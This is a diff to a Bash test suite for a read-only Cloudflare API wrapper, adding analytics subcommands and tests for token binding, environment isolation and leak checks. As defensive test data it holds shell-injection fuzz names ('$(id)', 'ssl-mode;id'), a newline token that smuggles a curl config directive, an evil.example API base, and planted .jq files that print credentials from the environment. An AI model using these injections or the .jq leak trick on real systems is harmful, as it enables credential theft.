+    refused_msg "$an with no hours" "$MSG_ARITY_AN" "$an"
+    refused_msg "$an with an extra argument" "$MSG_ARITY_AN" "$an" 24 extra
+    # bad hours with NO token set is a usage error (64), never a missing credential (10): validated before load_credential
+    run "DOPPLER_PROJECT=soleur" "DOPPLER_CONFIG=prd_terraform" -- "$an" 0
+    REFUSE_ROWS=$((REFUSE_ROWS + 1))
+    t "grammar: $an bad hours with no token set exits 64, not 10" eq "$RC|$(ncalls)" "64|0"
+    run "DOPPLER_PROJECT=soleur" "DOPPLER_CONFIG=prd_terraform" -- "$an"
+    t "grammar: $an with no arguments and no token set exits 64, not 10" eq "$RC|$(ncalls)" "64|0"
+    # a hostile zone id on an analytics arm is refused before any request: the arm reaches load_credential
+    mkenv CF_ZONE_ID
+    fixture 200 "$(ok_body "$an")"
+    run "${ENVX[@]}" "CF_ZONE_ID=${ZONE}\"x" -- "$an" 24
+    REFUSE_ROWS=$((REFUSE_ROWS + 1))
+    t "refuse: $an with a quote in CF_ZONE_ID -> exit 64, message names the variable, curl never called" eq "$RC|$ERR|$(ncalls)" "64|$MSG_ZONE|0"
+  done
+  refused_msg "an old subcommand with a second argument (ssl-mode 24)" "$MSG_USAGE_OLD" ssl-mode 24
+  refused_msg "change-history with a second argument" "$MSG_USAGE_OLD" change-history 24
+  refused_msg "--list with a second argument" "$MSG_USAGE_OLD" --list 24
+  refused_msg "no arguments at all" "$MSG_USAGE_OLD"
+  # must-pass neighbours of the cap: 1, 100 and 216 are accepted (the wire group also runs them end to end)
+  for hv in 1 100 216; do
+    fixture 200 "$(ok_body analytics-edge-errors)"
+    run "${BASE_ENV[@]}" -- analytics-edge-errors "$hv"
+    t "grammar: analytics-edge-errors at $hv hours is accepted" eq "$L1|$RC" "cloudflare-readonly: analytics-edge-errors ok|0"
+  done
   refused "unknown subcommand raw" raw
   refused "ssl-mode/extra" ssl-mode/extra
   refused "path traversal ../x" ../x
@@ -608,13 +771,13 @@ grp_refuse() {
 
   # --- unknown-subcommand fuzz: whatever the name, exit 64 and curl is never invoked ---
   local fz
-  for fz in api.cloudflare.com evil.example purge delete raw Ssl-Mode SSL-MODE '"ssl-mode"' "'ssl-mode'" 'ssl-mode;id' '$(id)' 'ssl-mode|raw' '*' 'ssl-*' '[s]sl-mode' '?sl-mode' 'ssl-mode ' ' ssl-mode' $'ssl-mode\n' 'ssl_mode' 'zones' '--' '-' '-h' 'help' 'status'; do
+  for fz in analytics-health analytics-edge-errors analytics 'analytics-*' 'analytics-health ' 'Analytics-Health' 'analytics-health;id' 'analytics_health' api.cloudflare.com evil.example purge delete raw Ssl-Mode SSL-MODE '"ssl-mode"' "'ssl-mode'" 'ssl-mode;id' '$(id)' 'ssl-mode|raw' '*' 'ssl-*' '[s]sl-mode' '?sl-mode' 'ssl-mode ' ' ssl-mode' $'ssl-mode\n' 'ssl_mode' 'zones' '--' '-' '-h' 'help' 'status'; do
     fixture 200 "$SSL_OK"
     run "${BASE_ENV[@]}" -- "$fz"
     REFUSE_ROWS=$((REFUSE_ROWS + 1))
     t "refuse fuzz: name $(printf '%q' "$fz") -> exit 64 and curl never called" bash -c '[[ "$1" == 64 && "$2" == 0 ]]' _ "$RC" "$(ncalls)"
   done
-  t "refuse floor: at least 60 refusal rows were exercised (zero checked is RED)" test "$((REFUSE_ROWS * 3))" -ge 60
+  t "refuse floor: at least 119 refusal runs were exercised (zero checked is RED)" test "$REFUSE_ROWS" -ge 119
 }
 
 # =============================================================================================
@@ -643,22 +806,23 @@ grp_token() {
   run "${ENVX[@]}" "CF_API_TOKEN_ZONE_SETTINGS=$TOK_Z   " -- ssl-mode
   t "token: trailing spaces are accepted (trimmed)" eq "$L1" "cloudflare-readonly: ssl-mode ok"
   # missing bound variable per subcommand
-  for s in "${SUBS[@]}"; do
+  for s in "${ALLSUBS[@]}"; do
+    sargs "$s"
     v=$(tokvar_of "$s")
     fixture 200 "$(ok_body "$s")"
     mkenv "$v"
-    run "${ENVX[@]}" -- "$s"
+    run "${ENVX[@]}" -- "${SARGS[@]}"
     t "token[$s]: missing $v -> exit 10" eq "$RC" 10
     t "token[$s]: missing $v -> unverified - no-credential naming the variable" eq "$L1" "cloudflare-readonly: $s unverified - no-credential ($v)"
     t "token[$s]: missing $v -> curl never called" eq "$(ncalls)" 0
     # only CF_API_TOKEN is present: no fallback
     mkenv "$v"
-    run "${ENVX[@]}" "CF_API_TOKEN=$TOK_BARE" -- "$s"
+    run "${ENVX[@]}" "CF_API_TOKEN=$TOK_BARE" -- "${SARGS[@]}"
     t "token[$s]: only CF_API_TOKEN present -> exit 10 (no fallback)" eq "$RC" 10
     t "token[$s]: only CF_API_TOKEN present -> curl never called" eq "$(ncalls)" 0
     # bound + CF_API_TOKEN present: the bound one only
     fixture 200 "$(ok_body "$s")"
-    run "${BASE_ENV[@]}" "CF_API_TOKEN=$TOK_BARE" -- "$s"
+    run "${BASE_ENV[@]}" "CF_API_TOKEN=$TOK_BARE" -- "${SARGS[@]}"
     tn "token[$s]: CF_API_TOKEN value never reaches stdin" has_file "$STUB/stdin.log" "$TOK_BARE"
     t "token[$s]: bound token reaches stdin" has_file "$STUB/stdin.log" "$(tok_of "$s")"
   done
@@ -685,6 +849,37 @@ grp_token() {
   run "${BASE_ENV[@]}" -- pagerules-ssl
   t "token: pagerules-ssl presents PAGERULES_READ" has_file "$STUB/stdin.log" "$TOK_P"
   tn "token: pagerules-ssl never presents the RULESETS token" has_file "$STUB/stdin.log" "$TOK_R"
+  # --- the analytics token (Guard 2): bound to the two analytics subcommands alone, no fallback either way ---
+  local an
+  for an in "${ANSUBS[@]}"; do
+    # only the four old tokens set: exit 10 naming the analytics variable, no request (no fallback to AUDIT or RULESETS)
+    fixture 200 "$(ok_body "$an")"
+    mkenv CF_API_TOKEN_ANALYTICS_READ
+    run "${ENVX[@]}" "CF_API_TOKEN=$TOK_BARE" -- "$an" 24
+    t "token[$an]: only the four old tokens set -> exit 10 naming CF_API_TOKEN_ANALYTICS_READ, curl never called" eq "$RC|$L1|$(ncalls)" "10|cloudflare-readonly: $an unverified - no-credential (CF_API_TOKEN_ANALYTICS_READ)|0"
+    # the analytics token alone is used when present, and no old token reaches stdin
+    fixture 200 "$(ok_body "$an")"
+    run "${BASE_ENV[@]}" "CF_API_TOKEN=$TOK_BARE" -- "$an" 24
+    t "token[$an]: the analytics token reaches stdin exactly once" eq "$(grep -cF -- "Bearer $TOK_N\"" "$STUB/stdin.log")" 1
+    tn "token[$an]: no old token and not CF_API_TOKEN reaches stdin" bash -c 'grep -qF -e "$2" -e "$3" -e "$4" -e "$5" -e "$6" "$1"' _ "$STUB/stdin.log" "$TOK_Z" "$TOK_R" "$TOK_P" "$TOK_A" "$TOK_BARE"
+    # a whitespace-padded token is trimmed; an allowed-punctuation token is sent whole (the base token carries every allowed character)
+    fixture 200 "$(ok_body "$an")"
+    run "${ENVX[@]}" "CF_API_TOKEN_ANALYTICS_READ=$TOK_N   " -- "$an" 24
+    t "token[$an]: a trailing-space analytics token is trimmed and accepted" eq "$L1" "cloudflare-readonly: $an ok"
+    # a token that would inject a config directive is refused before any request
+    fixture 200 "$(ok_body "$an")"
+    run "${ENVX[@]}" $'CF_API_TOKEN_ANALYTICS_READ=abc\ndata-raw = "x"' -- "$an" 24
+    t "token[$an]: a newline-bearing analytics token -> exit 64, curl never called" eq "$RC|$(ncalls)" "64|0"
+    # a 401/403 is recorded, never answered by a token swap: one request, one token
+  done
+  # only the analytics token (and the ids) set: the four old subcommands exit 10, send nothing, and never present it
+  local old
+  for old in "${SUBS[@]}"; do
+    fixture 200 "$(ok_body "$old")"
+    run "HOME=$HOMEDIR" "DOPPLER_PROJECT=soleur" "DOPPLER_CONFIG=prd_terraform" "CF_ZONE_ID=$ZONE" "CF_ACCOUNT_ID=$ACCT" "CF_API_TOKEN_ANALYTICS_READ=$TOK_N" -- "$old"
+    t "token[$old]: only the analytics token set -> exit 10, curl never called" eq "$RC|$(ncalls)" "10|0"
+    tn "token[$old]: only the analytics token set -> the analytics token appears in no output" contains "$(<"$WORK/comb.txt")" "$TOK_N"
+  done
 }
 
 # =============================================================================================
@@ -692,11 +887,12 @@ grp_token() {
 # =============================================================================================
 grp_env() {
   local s
-  for s in "${SUBS[@]}"; do
+  for s in "${ALLSUBS[@]}"; do
+    sargs "$s"
     fixture 200 "$(ok_body "$s")"
-    run "${BASE_ENV[@]}" "CF_API_TOKEN=$TOK_BARE" "PLANTED_CANARY=plantedvalue_5521" "HTTPS_PROXY=http://127.0.0.1:9" "CF_API_BASE=https://evil.example" -- "$s"
+    run "${BASE_ENV[@]}" "CF_API_TOKEN=$TOK_BARE" "PLANTED_CANARY=plantedvalue_5521" "HTTPS_PROXY=http://127.0.0.1:9" "CF_API_BASE=https://evil.example" -- "${SARGS[@]}"
     t "env[$s]: anchor - the stub dumped its environment (non-empty log)" test -s "$STUB/env.log"
-    tn "env[$s]: curl child sees no token (any of five)" bash -c 'grep -qF -e "$2" -e "$3" -e "$4" -e "$5" -e "$6" "$1"' _ "$STUB/env.log" "$TOK_Z" "$TOK_R" "$TOK_P" "$TOK_A" "$TOK_BARE"
+    tn "env[$s]: curl child sees no token (any of six)" bash -c 'grep -qF -e "$2" -e "$3" -e "$4" -e "$5" -e "$6" -e "$7" "$1"' _ "$STUB/env.log" "$TOK_Z" "$TOK_R" "$TOK_P" "$TOK_A" "$TOK_N" "$TOK_BARE"
     tn "env[$s]: curl child sees no CF_* variable" grep -q 'CF_' "$STUB/env.log"
     tn "env[$s]: curl child sees no planted non-TLS canary" grep -q 'PLANTED_CANARY' "$STUB/env.log"
     tn "env[$s]: curl child sees no DOPPLER_* variable" grep -q 'DOPPLER_' "$STUB/env.log"
@@ -710,10 +906,11 @@ grp_env() {
   t "env[jq] control: the planted .jq canary DOES print the token when jq inherits the environment (the probe is live)" has_file "$WORK/jqctl.txt" "$TOK_Z"
   /usr/bin/env -i HOME="$HOMEDIR" /usr/bin/jq -nc '"a" | test("a")' > "$WORK/jqctl2.txt" 2>&1
   tn "env[jq] control: the same canary prints nothing under env -i" has_file "$WORK/jqctl2.txt" "$TOK_Z"
-  for s in "${SUBS[@]}"; do
+  for s in "${ALLSUBS[@]}"; do
+    sargs "$s"
     printf 'def test(re): ($ENV.%s | debug | true);\n' "$(tokvar_of "$s")" > "$HOMEDIR/.jq"
     fixture 200 "$(ok_body "$s")"
-    run "${BASE_ENV[@]}" -- "$s"
+    run "${BASE_ENV[@]}" -- "${SARGS[@]}"
     t "env[jq/$s]: with a planted \$HOME/.jq the run is still ok" eq "$L1" "cloudflare-readonly: $s ok"
     t "env[jq/$s]: a planted \$HOME/.jq redefining test leaks no token to stdout or stderr" leak_scan "$WORK/comb.txt"
     t "env[jq/$s]: the output is exactly the two-line ok contract" eq "$(printf '%s\n' "$OUT" | wc -l)" 2
@@ -723,10 +920,11 @@ grp_env() {
   printf 'def type: ($ENV.%s | debug | "string");\n' CF_API_TOKEN_ZONE_SETTINGS > "$HOMEDIR/.jq"
   /usr/bin/env HOME="$HOMEDIR" "CF_API_TOKEN_ZONE_SETTINGS=$TOK_Z" /usr/bin/jq -nc '1 | type' > "$WORK/jqctl3.txt" 2>&1
   t "env[jq-guard] control: a planted .jq redefining type DOES print the token when jq inherits the environment (the probe is live)" has_file "$WORK/jqctl3.txt" "$TOK_Z"
-  for s in "${SUBS[@]}"; do
+  for s in "${ALLSUBS[@]}"; do
+    sargs "$s"
     printf 'def type: ($ENV.%s | debug | "string");\n' "$(tokvar_of "$s")" > "$HOMEDIR/.jq"
     fixture 200 "$(ok_body "$s")"
-    run "${BASE_ENV[@]}" -- "$s"
+    run "${BASE_ENV[@]}" -- "${SARGS[@]}"
     t "env[jq-guard/$s]: with a planted \$HOME/.jq redefining type (a builtin the guard program calls) the run is still ok" eq "$L1" "cloudflare-readonly: $s ok"
     t "env[jq-guard/$s]: that planted .jq leaks no token to stdout or stderr" leak_scan "$WORK/comb.txt"
   done
@@ -738,8 +936,18 @@ grp_env() {
 # =============================================================================================
 # scen <label> <status> <body> <curl_exit> <stderr> <want_rc> <want_line_suffix|"">
 status_cells() { # $1 = subcommand
-  local s="$1" okb cell
+  local s="$1" okb cell w400=upstream-error errb="$ERR_BODY" sfb
   okb=$(ok_body "$s")
+  sfb="{\"success\":false,\"errors\":[{\"code\":1,\"message\":\"$CANARY_BODY\"}],\"result\":[]}"
+  case "$s" in
+    analytics-health | analytics-edge-errors)
+      # a GraphQL 400 is an api-error; the vendor message is printed only when it passes the bounded gate, and the canary-bearing
+      # messages below hold a colon, which the gate refuses, so no canary can reach the output
+      w400=api-error
+      errb="{\"data\":null,\"errors\":[{\"message\":\"denied: $CANARY_BODY\"}]}"
+      sfb="{\"data\":null,\"errors\":[{\"message\":\"bad: $CANARY_BODY\"}]}"
+      ;;
+  esac
   local -a cells=(
     "200-ok|200|OK|0||0|ok"
     "401|401|ERR|0||11|unverified - token-invalid"
@@ -747,14 +955,14 @@ status_cells() { # $1 = subcommand
     "404|404|ERR|0||14|unverified - not-found"
     "429|429|ERR|0||14|unverified - upstream-error"
     "500|500|ERR|0||14|unverified - upstream-error"
-    "400|400|ERR|0||14|unverified - upstream-error"
+    "400|400|ERR|0||14|unverified - $w400"
     "302|302|ERR|0||14|unverified - upstream-error"
     "curl-fail|200|OK|7|$CANARY_ERR|14|unverified - upstream-error (curl exit 7)"
     "malformed|200|<html>$CANARY_BODY|0||14|unverified - bad-response"
     "wrongtype|200|\"$CANARY_BODY\"|0||14|unverified - bad-response"
     "null-result|200|{\"success\":true,\"result\":null}|0||14|unverified - bad-response"
     "nonnumeric|abc|OK|0||14|unverified - bad-response"
-    "success-false|200|{\"success\":false,\"errors\":[{\"code\":1,\"message\":\"$CANARY_BODY\"}],\"result\":[]}|0||14|unverified - api-error"
+    "success-false|200|SFB|0||14|unverified - api-error"
     "empty-output|NONE|OK|0||14|unverified - bad-response"
   )
   local name st body ce se wrc wl
@@ -763,10 +971,12 @@ status_cells() { # $1 = subcommand
     # the body field may itself hold '|' only in none of the fixtures above; OK/ERR are placeholders
     case "$body" in
       OK) body="$okb" ;;
-      ERR) body="$ERR_BODY" ;;
+      ERR) body="$errb" ;;
+      SFB) body="$sfb" ;;
     esac
     fixture "$st" "$body" "$ce" "$se"
-    run "${BASE_ENV[@]}" -- "$s"
+    sargs "$s"
+    run "${BASE_ENV[@]}" -- "${SARGS[@]}"
     t "status[$s/$name]: exit $wrc" eq "$RC" "$wrc"
     if [[ "$wl" == ok ]]; then
       t "status[$s/$name]: first line is ok" eq "$L1" "cloudflare-readonly: $s ok"
@@ -777,7 +987,7 @@ status_cells() { # $1 = subcommand
     t "status[$s/$name]: curl called exactly once (no retry, no second token)" eq "$(ncalls)" 1
     t "status[$s/$name]: the stub refused no flag" test ! -s "$STUB/refusal.log"
     t "leak[$s/$name]: stdout+stderr carry no token, canary, actor, IP or Bearer" leak_scan "$WORK/comb.txt"
-    t "leak[$s/$name]: argv log carries no token or Authorization" bash -c '! grep -qaF -e "$2" -e "$3" -e "$4" -e "$5" -e Authorization "$1"' _ "$STUB/argv.bin" "$TOK_Z" "$TOK_R" "$TOK_P" "$TOK_A"
+    t "leak[$s/$name]: argv log carries no token or Authorization" bash -c '! grep -qaF -e "$2" -e "$3" -e "$4" -e "$5" -e "$6" -e Authorization "$1"' _ "$STUB/argv.bin" "$TOK_Z" "$TOK_R" "$TOK_P" "$TOK_A" "$TOK_N"
     if [[ "$name" == 403 || "$name" == 401 ]]; then
       t "status[$s/$name]: only the bound token was presented" eq "$(grep -cF -- "Bearer $(tok_of "$s")\"" "$STUB/stdin.log" 2>/dev/null || true)" 1
     fi
@@ -798,10 +1008,10 @@ grp_status() {
     printf 'x %s y\n' "$n" > "$WORK/inj.txt"
     tn "leak control: needle $i is individually detected when injected" leak_scan "$WORK/inj.txt"
   done
-  t "leak control: needle list has at least 12 non-empty members" test "${#LEAK_NEEDLES[@]}" -ge 12
+  t "leak control: needle list has at least 14 non-empty members" test "${#LEAK_NEEDLES[@]}" -ge 14
   EXERCISED=0
-  for s in "${SUBS[@]}"; do status_cells "$s"; done
-  t "status floor: at least 4 subcommands x 3 outcomes exercised ($EXERCISED cells)" test "$EXERCISED" -ge 12
+  for s in "${ALLSUBS[@]}"; do status_cells "$s"; done
+  t "status floor: all 6 subcommands x 15 outcomes exercised ($EXERCISED cells)" test "$EXERCISED" -ge 90
 }
 
 # =============================================================================================
@@ -821,7 +1031,7 @@ grp_xtrace() {
   t "xtrace: anchor - --list under -x with NO token set is not refused" eq "$RC" 0
   # every bound variable ALONE (the case-glob list is a union; a variable missing from it only shows when it is the only one set)
   local xv
-  for xv in CF_API_TOKEN_ZONE_SETTINGS CF_API_TOKEN_RULESETS CF_API_TOKEN_PAGERULES_READ CF_API_TOKEN_AUDIT CF_API_TOKEN; do
+  for xv in CF_API_TOKEN_ZONE_SETTINGS CF_API_TOKEN_RULESETS CF_API_TOKEN_PAGERULES_READ CF_API_TOKEN_AUDIT CF_API_TOKEN_ANALYTICS_READ CF_API_TOKEN; do
     fixture 200 "$SSL_OK"
     RUNFLAGS=(-x)
     run "$xv=$TOK_BARE" -- ssl-mode
@@ -830,21 +1040,29 @@ grp_xtrace() {
     t "xtrace[$xv alone]: no token in the trace output" leak_scan "$WORK/comb.txt"
     t "xtrace[$xv alone]: curl never called" eq "$(ncalls)" 0
   done
+  # the analytics subcommands are refused under tracing too (the hours argument does not exempt them)
+  fixture 200 "$(ok_body analytics-health)"
+  RUNFLAGS=(-x)
+  run "${BASE_ENV[@]}" -- analytics-health 24
+  RUNFLAGS=()
+  t "xtrace[analytics-health]: under bash -x with the analytics token set the wrapper exits 78" eq "$RC" 78
+  t "xtrace[analytics-health]: no token in the trace output and curl never called" eq "$(leak_scan "$WORK/comb.txt"; echo $?)/$(ncalls)" "0/0"
 }
 
 # =============================================================================================
 # Group: proj (projections: shape, order, enum/regex checks, no vendor text)
 # =============================================================================================
 json2() { printf '%s' "${OUT#*$'\n'}"; }
-jqe() { # jqe <jq filter> : exit status of jq -e on the projection
-  json2 | jq -e "$1" > /dev/null
+jqe() { # jqe [jq options...] <jq filter> : exit status of jq -e on the projection
+  json2 | jq -e "$@" > /dev/null
 }
 PROJ_ROWS=0
 # pr <subcommand> <body>: one projection run. The proj group floor counts THESE runs (not t/ok, which the floor backstops).
 pr() {
   PROJ_ROWS=$((PROJ_ROWS + 1))
   fixture 200 "$2"
-  run "${BASE_ENV[@]}" -- "$1"
+  sargs "$1"
+  run "${BASE_ENV[@]}" -- "${SARGS[@]}"
 }
 # hostile <subcommand> <field label> <body> <jq assertion>: a canary-bearing value in ONE projected field is sanitized, never echoed.
 hostile() {
@@ -975,6 +1193,153 @@ grp_proj() {
   hostile change-history action-type '{"success":true,"result":[{"action":{"type":"ACTOR_CANARY","time":"2026-11-01T10:00:00Z"},"resource":{"type":"token"}}]}' '.by_action_type=={"invalid":1} and .by_resource_type=={"token":1}'
   hostile change-history resource-type '{"success":true,"result":[{"action":{"type":"token_create","time":"2026-11-01T10:00:00Z"},"resource":{"type":"EXPR_CANARY_rt"}}]}' '.by_resource_type=={"invalid":1} and .by_action_type=={"token_create":1}'
   hostile change-history action-time '{"success":true,"result":[{"action":{"type":"a","time":"EXPR_CANARY_t"},"resource":{"type":"t"}}]}' '.oldest_time==null and .newest_time==null'
+  grp_proj_an
+}
+
+# --- analytics projections (HTTP 200 GraphQL bodies; every vendor value is type- and range-checked) ---
+AN_NOTE_HEALTH="count is a sampled estimate (adaptive sampling); durations are origin response time for /health, not host- or requestSource-scoped"
+AN_NOTE_EDGE="counts are sampled estimates (adaptive sampling); edge-generated blank 502/503/504 pages may be under-reported by this dataset"
+# shape_bad <subcommand> <label> <body>: the run is bad-response (shape), exit 14, and nothing from the body is echoed
+shape_bad() {
+  pr "$1" "$3"
+  t "proj[$1]: $2 -> bad-response (shape), exit 14" eq "$L1|$RC" "cloudflare-readonly: $1 unverified - bad-response (shape)|14"
+  t "proj[$1]: $2 -> no canary or token in the output" leak_scan "$WORK/comb.txt"
+}
+# gql_err_body <message> : a 200 body whose first error carries <message>, with canaries in every other field
+gql_err_body() {
+  jq -nc --arg m "$1" '{data:null,errors:[{message:$m,path:["viewer","EXPR_CANARY_path"],extensions:{code:"DESC_CANARY_ext"}},{message:"ACTOR_CANARY second message"}],extra:"PATTERN_CANARY_x"}'
+}
+# err_line <label> <message> <want> : <want> is the exact text after "unverified - " on the first line
+err_line() {
+  pr analytics-health "$(gql_err_body "$2")"
+  t "proj[analytics-health]: api-error message $1" eq "$L1|$RC" "cloudflare-readonly: analytics-health unverified - $3|14"
+  t "proj[analytics-health]: api-error message $1 -> no canary, second message or token in the output" leak_scan "$WORK/comb.txt"
+}
+grp_proj_an() {
+  local g1000 g999 m k
+  # ---- analytics-health ----
+  pr analytics-health "$(gql_wrap "$HEALTH_OK_GROUPS")"
+  t "proj[analytics-health]: ok" eq "$L1|$RC" "cloudflare-readonly: analytics-health ok|0"
+  t "proj[analytics-health]: only the allowed keys at the top (no truncated, no vendor text)" jqe '(keys|sort)==["note","rows","series","subcommand","window_hours"]'
+  t "proj[analytics-health]: subcommand, window_hours and rows" jqe '.subcommand=="analytics-health" and .window_hours==24 and .rows==3'
+  t "proj[analytics-health]: only the allowed keys per series row" jqe 'all(.series[]; (keys|sort)==["avg_ms","count","hour","p50_ms","p90_ms"])'
+  t "proj[analytics-health]: durations are rounded to one decimal" jqe '.series[0]=={hour:"2026-11-01T10:00:00Z",count:120,avg_ms:332.5,p50_ms:300,p90_ms:478}'
+  t "proj[analytics-health]: a JSON null duration passes through as null" jqe '.series[1].avg_ms==null and .series[1].p50_ms==null and .series[1].p90_ms==null and .series[1].count==80'
+  t "proj[analytics-health]: a zero duration is kept as 0, not null" jqe '.series[2].avg_ms==0 and .series[2].p90_ms==855'
+  t "proj[analytics-health]: the series keeps the ascending hour order" jqe '[.series[].hour]==["2026-11-01T10:00:00Z","2026-11-01T11:00:00Z","2026-11-01T12:00:00Z"]'
+  t "proj[analytics-health]: the fixed note is present verbatim" jqe --arg n "$AN_NOTE_HEALTH" '.note==$n'
+  pr analytics-health "$(gql_wrap '[]')"
+  t "proj[analytics-health]: an empty window is ok with rows 0" jqe '.rows==0 and .series==[]'
+  pr analytics-health '{"data":{"viewer":{"zones":[{"httpRequestsAdaptiveGroups":[{"count":1,"dimensions":{"datetimeHour":"2026-11-01T10:00:00Z"},"avg":{"originResponseDurationMs":1},"quantiles":{"originResponseDurationMsP50":1,"originResponseDurationMsP90":1}}]}]}},"errors":[]}'
+  t "proj[analytics-health]: an empty errors array with data is ok" eq "$L1" "cloudflare-readonly: analytics-health ok"
+  # hostile or out-of-range values: bad-response (shape), never a counter, never a partial row
+  local row='{"count":5,"dimensions":{"datetimeHour":"2026-11-01T10:00:00Z"},"avg":{"originResponseDurationMs":1},"quantiles":{"originResponseDurationMsP50":1,"originResponseDurationMsP90":2}}'
+  shape_bad analytics-health "a string count" "$(gql_wrap "[$(jq -c '.count="5"' <<<"$row")]")"
+  shape_bad analytics-health "a negative count" "$(gql_wrap "[$(jq -c '.count=-1' <<<"$row")]")"
+  shape_bad analytics-health "a fractional count" "$(gql_wrap "[$(jq -c '.count=1.5' <<<"$row")]")"
+  shape_bad analytics-health "a count above 1e12" "$(gql_wrap "[$(jq -c '.count=10000000000000' <<<"$row")]")"
+  shape_bad analytics-health "a null count" "$(gql_wrap "[$(jq -c '.count=null' <<<"$row")]")"
+  shape_bad analytics-health "a hostile hour (EXPR_CANARY)" "$(gql_wrap "[$(jq -c '.dimensions.datetimeHour="EXPR_CANARY_hour"' <<<"$row")]")"
+  shape_bad analytics-health "an offset-form hour" "$(gql_wrap "[$(jq -c '.dimensions.datetimeHour="2026-11-01T10:00:00+01:00"' <<<"$row")]")"
+  shape_bad analytics-health "a numeric hour" "$(gql_wrap "[$(jq -c '.dimensions.datetimeHour=5' <<<"$row")]")"
+  shape_bad analytics-health "a missing hour" "$(gql_wrap "[$(jq -c 'del(.dimensions.datetimeHour)' <<<"$row")]")"
+  shape_bad analytics-health "a string avg" "$(gql_wrap "[$(jq -c '.avg.originResponseDurationMs="DESC_CANARY_avg"' <<<"$row")]")"
+  shape_bad analytics-health "a negative p50" "$(gql_wrap "[$(jq -c '.quantiles.originResponseDurationMsP50=-1' <<<"$row")]")"
+  shape_bad analytics-health "a p90 above 1e7" "$(gql_wrap "[$(jq -c '.quantiles.originResponseDurationMsP90=20000000' <<<"$row")]")"
+  shape_bad analytics-health "a missing avg object" "$(gql_wrap "[$(jq -c 'del(.avg)' <<<"$row")]")"
+  shape_bad analytics-health "a group that is not an object" "$(gql_wrap '[5]')"
+  shape_bad analytics-health "groups that are not an array" "$(gql_wrap '{"a":1}')"
+  shape_bad analytics-health "data null with no errors" '{"data":null,"errors":null}'
+  shape_bad analytics-health "a body with no data at all" '{"errors":null}'
+  shape_bad analytics-health "two zones" '{"data":{"viewer":{"zones":[{"httpRequestsAdaptiveGroups":[]},{"httpRequestsAdaptiveGroups":[]}]}},"errors":null}'
+  shape_bad analytics-health "a zone with no groups field" '{"data":{"viewer":{"zones":[{}]}},"errors":null}'
+  shape_bad analytics-health "zones that is not an array" '{"data":{"viewer":{"zones":{}}},"errors":null}'
+  shape_bad analytics-health "errors that is a string" '{"data":null,"errors":"EXPR_CANARY_errs"}'
+  pr analytics-health '{"data":{"viewer":{"zones":[]}},"errors":null}'
+  t "proj[analytics-health]: zones [] with no errors -> unverified - no-zone-access, exit 14 (not 11)" eq "$L1|$RC" "cloudflare-readonly: analytics-health unverified - no-zone-access|14"
+  pr analytics-edge-errors '{"data":{"viewer":{"zones":[]}},"errors":null}'
+  t "proj[analytics-edge-errors]: zones [] with no errors -> unverified - no-zone-access, exit 14 (not 11)" eq "$L1|$RC" "cloudflare-readonly: analytics-edge-errors unverified - no-zone-access|14"
+
+  # ---- analytics-edge-errors ----
+  pr analytics-edge-errors "$(gql_wrap "$EDGE_OK_GROUPS")"
+  t "proj[analytics-edge-errors]: ok" eq "$L1|$RC" "cloudflare-readonly: analytics-edge-errors ok|0"
+  t "proj[analytics-edge-errors]: only the allowed keys at the top" jqe '(keys|sort)==["by_status","hourly","note","rows","subcommand","truncated","window_hours"]'
+  t "proj[analytics-edge-errors]: rows, window_hours and truncated false below the limit" jqe '.subcommand=="analytics-edge-errors" and .window_hours==24 and .rows==4 and .truncated==false'
+  t "proj[analytics-edge-errors]: by_status sums the counts per observed status, keyed as strings" jqe '.by_status=={"502":7,"503":3,"520":4}'
+  t "proj[analytics-edge-errors]: hourly is sorted ascending by hour then status" jqe '[.hourly[]|[.hour,.status,.count]]==[["2026-11-01T10:00:00Z",502,5],["2026-11-01T11:00:00Z",502,2],["2026-11-01T11:00:00Z",503,3],["2026-11-01T12:00:00Z",520,4]]'
+  t "proj[analytics-edge-errors]: the fixed note is present verbatim" jqe --arg n "$AN_NOTE_EDGE" '.note==$n'
+  pr analytics-edge-errors "$(gql_wrap '[]')"
+  t "proj[analytics-edge-errors]: an empty window is ok with no statuses" jqe '.rows==0 and .by_status=={} and .hourly==[] and .truncated==false'
+  pr analytics-edge-errors "$(gql_wrap '[{"count":1,"dimensions":{"datetimeHour":"2026-11-01T10:00:00Z","edgeResponseStatus":500}},{"count":2,"dimensions":{"datetimeHour":"2026-11-01T10:00:00Z","edgeResponseStatus":599}}]')"
+  t "proj[analytics-edge-errors]: statuses 500 and 599 are inside the 500..599 bound" jqe '.by_status=={"500":1,"599":2}'
+  g1000=$(jq -nc '[range(1000)|{count:1,dimensions:{datetimeHour:"2026-11-01T10:00:00Z",edgeResponseStatus:502}}]')
+  g999=$(jq -nc '[range(999)|{count:1,dimensions:{datetimeHour:"2026-11-01T10:00:00Z",edgeResponseStatus:502}}]')
+  pr analytics-edge-errors "$(gql_wrap "$g1000")"
+  t "proj[analytics-edge-errors]: 1000 rows -> truncated true" jqe '.rows==1000 and .truncated==true and .by_status=={"502":1000}'
+  pr analytics-edge-errors "$(gql_wrap "$g999")"
+  t "proj[analytics-edge-errors]: 999 rows -> truncated false" jqe '.rows==999 and .truncated==false'
+  local erow='{"count":5,"dimensions":{"datetimeHour":"2026-11-01T10:00:00Z","edgeResponseStatus":502}}'
+  shape_bad analytics-edge-errors "a 404 status (outside 500..599)" "$(gql_wrap "[$(jq -c '.dimensions.edgeResponseStatus=404' <<<"$erow")]")"
+  shape_bad analytics-edge-errors "a 499 status" "$(gql_wrap "[$(jq -c '.dimensions.edgeResponseStatus=499' <<<"$erow")]")"
+  shape_bad analytics-edge-errors "a 600 status" "$(gql_wrap "[$(jq -c '.dimensions.edgeResponseStatus=600' <<<"$erow")]")"
+  shape_bad analytics-edge-errors "a string status" "$(gql_wrap "[$(jq -c '.dimensions.edgeResponseStatus="502"' <<<"$erow")]")"
+  shape_bad analytics-edge-errors "a fractional status" "$(gql_wrap "[$(jq -c '.dimensions.edgeResponseStatus=502.5' <<<"$erow")]")"
+  shape_bad analytics-edge-errors "a missing status" "$(gql_wrap "[$(jq -c 'del(.dimensions.edgeResponseStatus)' <<<"$erow")]")"
+  shape_bad analytics-edge-errors "a negative count" "$(gql_wrap "[$(jq -c '.count=-3' <<<"$erow")]")"
+  shape_bad analytics-edge-errors "a hostile hour" "$(gql_wrap "[$(jq -c '.dimensions.datetimeHour="PATTERN_CANARY_h"' <<<"$erow")]")"
+  shape_bad analytics-edge-errors "data null with no errors" '{"data":null}'
+  shape_bad analytics-edge-errors "two zones" '{"data":{"viewer":{"zones":[{"httpRequestsAdaptiveGroups":[]},{"httpRequestsAdaptiveGroups":[]}]}},"errors":null}'
+
